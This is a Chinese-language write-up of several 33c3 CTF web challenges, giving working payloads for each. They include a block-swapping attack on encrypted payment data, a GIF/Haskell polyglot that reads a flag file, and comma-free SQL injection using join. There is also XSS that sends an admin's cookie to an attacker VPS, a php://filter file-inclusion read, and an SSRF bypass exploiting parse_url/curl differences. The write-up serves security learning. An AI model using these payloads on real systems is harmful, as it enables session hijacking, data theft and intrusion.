##pay2win
key:传递的参数包含返回信息，可以简单地组合改变返回信息
先buy cheap，提示输入一个credit card number，从网上找一个就行了。这里长度做了限制，前端的限制绕过方法太多。burp抓个包改一下就行了。然后返回的页面中显示了：
Payment status: good, filename: cheap.txt, content:.....
，以及一个302，这里注意url里面带了一个参数，这里面应该是返回的信息的加密：
5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8
用相同的credit card number 去买flag,返回的页面显示status fail 又得到一串信息：232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f6b1ab6ad341517883d268088e3a09e2382f7ef761e2bbe791
在这里还没有找到答案，我又换了一个credit card number 去 buy cheap, 得到：
5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8987a0784e817ab5a28df361f896eb3c3706cda0474915040
可以发现对比上一个credit number，只有中间一段发生了变化，所以这里就猜测这段信息包含了status这个信息而且信息每一块是独立的。
然后根据之前的不同卡号的信息来分块，得到三块
5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8
28df361f896eb3c3706cda0474915040
0a2ba2c99fe2ae2c,
再用这个卡号buy flag，得到
232c66210158dfb23a2eda5cc945a0a9650c1ed0fa0a08f6 ad883f5c045f4b88e66e4072c01c70f4
2f7ef761e2bbe791，
因为中间一块对不同卡号有变化，说明储存的是卡号，所以前面和后面一块有一个储存status,有一个储存买的是什么，就一次按相同的位置替换成buy cheap中的那段信息就行了，最后发现替换前面就可以
最后地址：
http://78.46.224.78:5000/payment/callback?data=5765679f0870f4309b1a3c83588024d7c146a4104cf9d2c8ad883f5c045f4b88e66e4072c01c70f42f7ef761e2bbe791 


##try
Key:伪造文件头，执行上传文件。（神他妈考haskell语法。不过也有启示，静态语言的定义的位置都是可以随便放的。脚本写多了这个都忘了。所以可以先调用后定义都可以。）
进入页面随便先测试了一下，存在的功能：
·执行一段hs代码
·登陆后可以上传profile的头像，头像必须是gif，测试了一下必须是gif的文件格式，具体怎么验证的不太清楚，反正必须有文件头GIF89a和一个文件流中间的东西
·run的位置可以直接用firebug改。
·代码文件位于/static/, 头像位于/static/33c3_8a3479bb-500e-45be-a66c-258f442d7fe7/pic.gif, 虽然不能访问父路径，但是可以直接执行头像文件
在这里构造头像文件为：
GIF89a a=N--mmza :: [Integer] --("*,&(")+1
data GIF89a a = GIF89a a | N
                                                                       
main = do
	a <- readFile "/challenge/flag"
	print a
文件头存在，然后特殊的文件流被注释掉了，后面定义了GIF89a类并且成功执行了readFile函数得到flag，flag位置是在题目描述中写的，也就是构造了一段可以绕过gif检测的hs代码然后执行，得到flag


##shia
key:构造列使用union，利用join绕过逗号过滤
这道题就是很直接让sql注入。。一脸懵逼
http://78.46.224.75/quote/1
这个页面存在注入，发现过滤了字符而且会有回显（"nice try"），先用个脚本跑一下看哪些字符被ban了,  比较重要的：
逗号 引号  \x09 \x0a, 空格 被ban了
所以空格只能用\x0d代替，然后关键词select，union，join被屏蔽了，双写绕过。
题目hint flag表有4个columns
先用order by求出当前表是3列，所以不能在不知道flag列名的情况下求出字段(如果是4列直接union select * from flag即可) information_schema被限制了不能访问
所以只能想办法搞出像 select 1,2,3,4 union select * from flag这样的查询
然后就是逗号被过滤了，所以union select 1,2,3是不行的，这里利用join可以构造出查询出是三列字段的， union select * from (select 1)a join (select 2)b join (select 3)c与当前的3列匹配(查询出来的结果和union select 1,2,3是一样的，在这里又加深了对union查询的理解，只要union查询出来的结果的列数匹配查询的列数就行了，方法不重要，结果才重要)，所以这个查询能够执行。
然后把 select 1,2,3,4 union select * from flag换成
select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5(limit 0,1  这种换成了 limit 0 offset 0)
然后一列一列回显查出来的数据就行了
 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
 

##yolovault
KEY：frame在同源可以相互通信
这道题复现不了，所以只是记录一下重点。
登录后查看源码可以找到/?page=is...&debug
访问之后去掉page参数得到查看源码的页面，把网站的源码下下来
这道题的思路就是XSS得到admin 的secret，代码审计发现只有 profile.php 中有一个地方
<?= session['username']?>没有过滤，所以可以注册一个用户名<script src=//vps/a.js></script>
账户执行xss。
在vps上设置一个html上有两个frame，admin访问html的时候先用第一个frame指向secret
然后在执行脚本让admin用第二个窗口登录执行xss盗取第一个frame的内容，因为两个frame都是在127.0.0.1同源，所以可以相互通信（admin登录用form然后target到第二个窗口）（所以这个算是session的漏洞了，同源不同sessoin是可以相互访问的，只要能够想办法在同一个窗口显示不同session的frame，然后通过window.top.frames[]就可以对另外的窗口进行操作。）

留下solution备忘



##yoso
KEY: XSS,域名用数字ip，javascript类属性用['str']代替点操作符。
题目描述了flag就在admin的搜索记录里面
在页面随便搜索几次之后，在bookmark.php页面可以备份自己的操作记录，用burp抓了下包，发现post备份文件名和password到bookmark.php后302到download.php/?zip=xpo/Xposimon123
然后随便爬了下发现有feedback.php页面，可以提供一个link然后admin会访问
（反思：就是从这里自己的思路搞错了。。。我想的是csrf，让admin post数据到bookmark.php但是不跳转，然后我去访问?zip/admin/我设置的文件名，把这个备份下下来。。。。然后搞了很久不知道怎么才能够让admin post数据。我想的是在vps上一个php页面然后跳转bookmark.php,但是这样post的前提是admin必须是在当前域跳转到我的vps上才会有cookie，如果admin是直接访问的vps是没有cookie的，这样就算post了数据也没用。（不过好像form表单可以带第三方cookie？所以这样是可以带着cookie post的？不过就算这样，form表单会自动302跳转，我看download.php的实现应该是创建临时文件，传输后就删除，所以其实不访问download.php的话是无法下载的，访问了download.php临时文件也是会被删除的。。所以我的思路一开始就错了。。。!!?? 就算我去访问download.php但是不是302跳转过去的也没有任何意义，所以还是得要admin的cookie！所以以后想清楚脚本的实现方法。到底可不可行。。））
在download.php页面，把zip的参数改一下，发现会直接返回参数值到页面，所以这里是存在XSS可能的。尝试
download.php?zip=<script>alert(1);</script>
正常弹框，说明存在xss，再尝试
download.php?zip=<script>window.location.href="vps"+escape(document.cookie);</script>
发现所有的 点都被过滤了
所以要提交一个没有点的script
域名换成数字ip
window.location.href 的赋值可以简单为对window.location的赋值，然后改类属性的访问方式
window['location'], 后面的document.cookie 改成 document['cookie']
新的payload
download.php?zip=<script>window['location']="http://vps数字ip"+escape(document.cookie);</script> （当然这个url要转码）
得到admin的cookie，然后直接admin登录，查看一下搜索记录就得到flag了
另外的方法：
点号可以直接在php中用\x2e转义就行了，所以把payload改成<script>eval("location\x2ehref=....."),把点全部换成16进制就行了


##list0r
Key: ssrf, 代码审计，文件包含
有两个比较重要的点：
http://78.46.224.80/?page=php://filter/read=convert.base64-encode/resource=index&list=1624 在index.php的page参数存在文件包含，可以直接把所有的源码下下来，没有00截断也不能访问父目录，所以这里也没有太多能做的了
然后在profile页面可以改profile的头像，但是是url形式，这里存在ssrf的可能性
然后看代码
if (isset($_POST["pic"]) && $_POST["pic"] != "" && !is_admin()) {
    $pic = get_contents($_POST["pic"]);
    if (!is_image($pic)) {
        die("<p><h3 style=color:red>Does this look like an image to you???????? people are dumb these days...</h3></p>" . htmlspecialchars($pic));
    } else {
        $pic_name = "profiles/" . sha1(rand());
        file_put_contents($pic_name, $pic);
    }
}
这是获得头像的代码，可以看到这里能够得到访问的文件内容，就算不是一个图片（htmlspecialchars($pic));）
<?php
function verify_password($username, $password) {
    global $redis;

    $user_id = $redis->hget("users", $username);
    if ($user_id) {
        $real_pass = $redis->hget("user:$user_id", "password");
        return $user_id;
    }
    return FALSE;
}
这里可以看到其实是没有验证的，所以只要用户名正确就可以登录（我不是很清楚这里，去了解一下php的redis的函数）
然后以admin登录就行了，在admin的list里面看到了flag的地址/reeeaally/reallyy/c00l/and_aw3sme_flag
去访问，发现只有127.0.0.1可以访问，改client-ip和xff都没用，所以这里只能想到是ssrf
这个getimage的url存在过滤，现在就是要绕过过滤然后访问flag就行了
function in_cidr($cidr, $ip) {
    list($prefix, $mask) = explode("/", $cidr);

    return 0 === (((ip2long($ip) ^ ip2long($prefix)) >> $mask) << $mask);
}

function get_contents($url) {
    $disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];

    do {
        $url_parts = parse_url($url);

        if (!array_key_exists("host", $url_parts)) {
            die("<p><h3 style=color:red>There was no host in your url!</h3></p>");
        }

        $host = $url_parts["host"];

        if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            $ip = $host;
        } else {
            $ip = dns_get_record($host, DNS_A);
            if (count($ip) > 0) {
                $ip = $ip[0]["ip"];
                debug("Resolved to {$ip}");
            } else {
                die("<p><h3 style=color:red>Your host couldn't be resolved man...</h3></p>");
            }
        }

        foreach ($disallowed_cidrs as $cidr) {
            if (in_cidr($cidr, $ip)) {
                die("<p><h3 style=color:red>That IP is a blacklisted cidr ({$cidr})!</h3></p>");
            }
        }

        // all good, curl now
        debug("Curling {$url}");
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_MAXREDIRS, 0);
        curl_setopt($curl, CURLOPT_TIMEOUT, 3);
        curl_setopt($curl, CURLOPT_PROTOCOLS, CURLPROTO_ALL 
            & ~CURLPROTO_FILE 
            & ~CURLPROTO_SCP); // no files plzzz
        curl_setopt($curl, CURLOPT_RESOLVE, array($host.":".$ip)); // no dns rebinding plzzz

        $data = curl_exec($curl);

        if (!$data) {
            die("<p><h3 style=color:red>something went wrong....</h3></p>");
        }

        if (curl_error($curl) && strpos(curl_error($curl), "timed out")) {
            die("<p><h3 style=color:red>Timeout!! thats a slowass  server</h3></p>");
        }

        // check for redirects
        $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        if ($status >= 301 and $status <= 308) {
            $url = curl_getinfo($curl, CURLINFO_REDIRECT_URL);
        } else {
            return $data;
        }

    } while (1);
}
127.0.0.1/24都被过滤了，这里需要利用parse_url函数和curl的解析url的方式不同。
（这里最后一步不会，当学习吧。。）
http://what:ever@127.0.0.1:80@33c3ctf.ccc.ac/reeeaally/reallyy/c00l/and_aw3sme_flag
对于这样一个url，parse_url会解析成
array (
  'scheme' => 'http',
  'host' => '33c3ctf.ccc.ac',
  'user' => 'what',
  'pass' => 'ever@127.0.0.1:80',
  'path' => '/reeeaally/reallyy/c00l/and_aw3sme_flag',
)
这样是可以过过滤的，然而在curl里面host会是127.0.0.1:80, （@后面是什么？），然后访问后面的地址。在profile页面访问这个url就得到了flag


